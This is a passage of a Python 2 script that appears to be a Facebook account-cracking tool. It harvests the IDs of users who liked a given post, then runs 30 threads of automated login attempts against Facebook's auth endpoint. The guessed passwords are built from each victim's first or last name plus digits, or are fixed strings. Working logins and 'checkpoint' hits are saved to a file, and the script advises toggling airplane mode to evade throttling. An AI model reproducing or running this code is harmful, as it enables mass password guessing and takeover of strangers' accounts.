                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                        ko = json.load(data)
                        if 'access_token' in ko:
                            print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos4
                            oke = open('done/indo.txt', 'a')
                            oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos4 + '\n')
                            oke.close()
                            oks.append(zowe)
                        elif 'www.facebook.com' in ko['error_msg']:
                            print '\n\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} \x1b[1;93mCHECKPOINT'
                            print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                            print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m' + zowe
                            print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m' + bos4
                            cek = open('done/indo.txt', 'a')
                            cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos4 + '\n')
                            cek.close()
                            cekpoint.append(zowe)
                        else:
                            bos5 = 'Kalimata123'
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            ko = json.load(data)
                            if 'access_token' in ko:
                                print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
                                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos5
                                oke = open('done/indo.txt', 'a')
                                oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos5 + '\n')
                                oke.close()
                                oks.append(zowe)
                            elif 'www.facebook.com' in ko['error_msg']:
                                print '\n\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} \x1b[1;93mCHECKPOINT'
                                print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                                print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m' + zowe
                                print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m' + bos5
                                cek = open('done/indo.txt', 'a')
                                cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos5 + '\n')
                                cek.close()
                                cekpoint.append(zowe)
                            else:
                                bos6 = j['first_name'].lower() + '123456'
                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                ko = json.load(data)
                                if 'access_token' in ko:
                                    print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
                                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos6
                                    oke = open('done/indo.txt', 'a')
                                    oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos6 + '\n')
                                    oke.close()
                                    oks.append(zowe)
                                elif 'www.facebook.com' in ko['error_msg']:
                                    print '\n\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} \x1b[1;93mCHECKPOINT'
                                    print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                                    print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m' + zowe
                                    print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m' + bos6
                                    cek = open('done/indo.txt', 'a')
                                    cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos6 + '\n')
                                    cek.close()
                                    cekpoint.append(zowe)
                                else:
                                    bos7 = j['last_name'].lower() + '123456'
                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                    ko = json.load(data)
                                    if 'access_token' in ko:
                                        print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
                                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos7
                                        oke = open('done/indo.txt', 'a')
                                        oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos7 + '\n')
                                        oke.close()
                                        oks.append(zowe)
                                    elif 'www.facebook.com' in ko['error_msg']:
                                        print '\n\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} \x1b[1;93mCHECKPOINT'
                                        print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                                        print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m' + zowe
                                        print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m' + bos7
                                        cek = open('done/indo.txt', 'a')
                                        cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos7 + '\n')
                                        cek.close()
                                        cekpoint.append(zowe)
                                    else:
                                        bos8 = 'Kumar123'
                                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos8 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                        ko = json.load(data)
                                        if 'access_token' in ko:
                                            print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
                                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos8
                                            oke = open('done/indo.txt', 'a')
                                            oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos8 + '\n')
                                            oke.close()
                                            oks.append(zowe)
                                        elif 'www.facebook.com' in ko['error_msg']:
                                            print '\n\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} \x1b[1;93mCHECKPOINT'
                                            print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                                            print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m' + zowe
                                            print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m' + bos8
                                            cek = open('done/indo.txt', 'a')
                                            cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos8 + '\n')
                                            cek.close()
                                            cekpoint.append(zowe)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'
    print '\x1b[1;97m{\x1b[1;93m\xe2\x97\x8f\x1b[1;97m} \x1b[1;93mProses Done ...'
    print '\x1b[1;97m{\x1b[1;93m\xe2\x97\x8f\x1b[1;97m} \x1b[1;93mTotal \x1b[1;92mOK\x1b[1;97m/\x1b[1;93mCP \x1b[1;97m: \x1b[1;92m' + str(len(oks)) + '\x1b[1;97m/\x1b[1;93m' + str(len(cekpoint))
    print '\x1b[1;97m{\x1b[1;93m\xe2\x97\x8f\x1b[1;97m} \x1b[1;92mOK\x1b[1;97m/\x1b[1;93mCP \x1b[1;93mfile Save \x1b[1;91m: \x1b[1;92mcopy or copy'
    print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'
    raw_input('\x1b[1;97m{<\x1b[1;93mKeluar\x1b[1;97m>}')
    os.system('python2 Craker.py')


def crack_likes():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;97m[!] Token invalid'
        os.system('rm -rf login.txt')
        time.sleep(0.01)
        login()

    try:
        os.system('clear')
        print logo20
        print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'
        print '        \x1b[1;96m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f \x1b[1;97mCRACK POSTING GROUP/Friend\x1b[1;96m \xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f'
        print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'
        tez = raw_input('\x1b[1;97m{\x1b[1;96m\xe2\x97\x8f\x1b[1;97m}\x1b[1;96m ID Posting Group/Friend \x1b[1;91m :\x1b[1;92m ')
        r = requests.get('https://graph.facebook.com/' + tez + '/likes?limit=9999999&access_token=' + toket)
        z = json.loads(r.text)
        for i in z['data']:
            id.append(i['id'])

        jalan('\r\x1b[1;97m{\x1b[1;96m\xe2\x97\x8f\x1b[1;97m} \x1b[1;96mTake ID \x1b[1;97m...')
    except KeyError:
        print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} ID Posting wrong !'
        raw_input('\n\x1b[1;96m[<\x1b[1;97mKeluar>\x1b[1;96m]')
        menu()

    print '\x1b[1;97m{\x1b[1;96m\xe2\x97\x8f\x1b[1;97m} \x1b[1;96mTotal ID \x1b[1;91m:\x1b[1;92m ' + str(len(id))
    print '\x1b[1;97m{\x1b[1;96m\xe2\x97\x8f\x1b[1;97m} \x1b[1;96mStop Token CTRL+Z'
    titik = ['.   ', '..  ', '... ']
    for o in titik:
        print '\r\x1b[1;97m{\x1b[1;96m\xe2\x97\x8f\x1b[1;97m} \x1b[1;96mCrack Starting ' + o,
        sys.stdout.flush()
        time.sleep(1)

    print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'
    print '\x1b[1;97m{\x1b[1;93m!\x1b[1;97m} \x1b[1;95mIf the Crack is Still Old'
    print '\x1b[1;97m{\x1b[1;93m!\x1b[1;97m} \x1b[1;95mTurn on Airplane Mode for 5 Seconds'
    print '\x1b[1;97m{\x1b[1;93m!\x1b[1;97m} \x1b[1;95mCheckpoint Save 7/10 Days'
    print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'

    def main(arg):
        sys.stdout.write(('\r{}').format(datetime.now().strftime('\x1b[1;96m%H\x1b[1;91m:\x1b[1;93m%M\x1b[1;91m:\x1b[1;92m%S')))
        sys.stdout.flush()
        zowe = arg
        try:
            os.mkdir('done')
        except OSError:
            pass

        try:
            an = requests.get('https://graph.facebook.com/' + zowe + '/?access_token=' + toket)
            j = json.loads(an.text)
            bos1 = j['first_name'].lower() + '123'
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            ko = json.load(data)
            if 'access_token' in ko:
                print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos1
                oke = open('done/indo.txt', 'a')
                oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos1 + '\n')
                oke.close()
                oks.append(zowe)
            elif 'www.facebook.com' in ko['error_msg']:
                print '\n\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} \x1b[1;93mCHECKPOINT'
                print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m' + zowe
                print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m' + bos1
                cek = open('done/indo.txt', 'a')
                cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos1 + '\n')
                cek.close()
                cekpoint.append(zowe)
            else:
                bos2 = j['first_name'].lower() + '1234'
                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                ko = json.load(data)
                if 'access_token' in ko:
                    print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos2
                    oke = open('done/indo.txt', 'a')
                    oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos2 + '\n')
                    oke.close()
                    oks.append(zowe)
                elif 'www.facebook.com' in ko['error_msg']:
                    print '\n\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} \x1b[1;93mCHECKPOINT'
                    print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                    print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m' + zowe
                    print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m' + bos2
                    cek = open('done/indo.txt', 'a')
                    cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos2 + '\n')
                    cek.close()
                    cekpoint.append(zowe)
                else:
                    bos3 = j['first_name'].lower() + '12345'
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    ko = json.load(data)
                    if 'access_token' in ko:
                        print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos3
                        oke = open('done/indo.txt', 'a')
                        oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos3 + '\n')
                        oke.close()
                        oks.append(zowe)
                    elif 'www.facebook.com' in ko['error_msg']:
                        print '\n\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} \x1b[1;93mCEKPOINT'
                        print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                        print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m' + zowe
                        print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m' + bos3
                        cek = open('done/indo.txt', 'a')
                        cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos3 + '\n')
                        cek.close()
                        cekpoint.append(zowe)
                    else:
                        bos4 = j['first_name'].lower() + '@123'
                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                        ko = json.load(data)
                        if 'access_token' in ko:
                            print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos4
                            oke = open('done/indo.txt', 'a')
                            oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos4 + '\n')
                            oke.close()
                            oks.append(zowe)
                        elif 'www.facebook.com' in ko['error_msg']:
                            print '\n\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} \x1b[1;93mCHECKPOINT'
                            print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                            print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m' + zowe
                            print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m' + bos4
                            cek = open('done/indo.txt', 'a')
                            cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos4 + '\n')
                            cek.close()
                            cekpoint.append(zowe)
                        else:
                            bos5 = j['first_name'].lower() + '007'
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            ko = json.load(data)
                            if 'access_token' in ko:
                                print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
                                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos5
                                oke = open('done/indo.txt', 'a')
                                oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos5 + '\n')
                                oke.close()
                                oks.append(zowe)
                            elif 'www.facebook.com' in ko['error_msg']:
                                print '\n\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} \x1b[1;93mCHECKPOINT'
                                print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                                print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m' + zowe
                                print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m' + bos5
                                cek = open('done/indo.txt', 'a')
                                cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos5 + '\n')
                                cek.close()
                                cekpoint.append(zowe)
                            else:
                                bos6 = j['first_name'].lower() + '123456'
                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                ko = json.load(data)
                                if 'access_token' in ko:
                                    print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
                                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos6
                                    oke = open('done/indo.txt', 'a')
                                    oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos6 + '\n')
                                    oke.close()
                                    oks.append(zowe)
                                elif 'www.facebook.com' in ko['error_msg']:
                                    print '\n\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} \x1b[1;93mCHECKPOINT'
                                    print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                                    print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m' + zowe
                                    print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m' + bos6
                                    cek = open('done/indo.txt', 'a')
                                    cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos6 + '\n')
                                    cek.close()
                                    cekpoint.append(zowe)
                                else:
                                    bos7 = j['last_name'].lower() + '123456'
                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                    ko = json.load(data)
                                    if 'access_token' in ko:
                                        print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
                                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos7
                                        oke = open('done/indo.txt', 'a')
                                        oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos7 + '\n')
                                        oke.close()
                                        oks.append(zowe)
                                    elif 'www.facebook.com' in ko['error_msg']:
                                        print '\n\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} \x1b[1;93mCHECKPOINT'
                                        print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                                        print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m' + zowe
                                        print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m' + bos7
                                        cek = open('done/indo.txt', 'a')
                                        cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos7 + '\n')
                                        cek.close()
                                        cekpoint.append(zowe)
                                    else:
                                        bos8 = j['first_name'].lower() + '123456789'
                                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos8 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                        ko = json.load(data)
                                        if 'access_token' in ko:
                                            print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
                                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
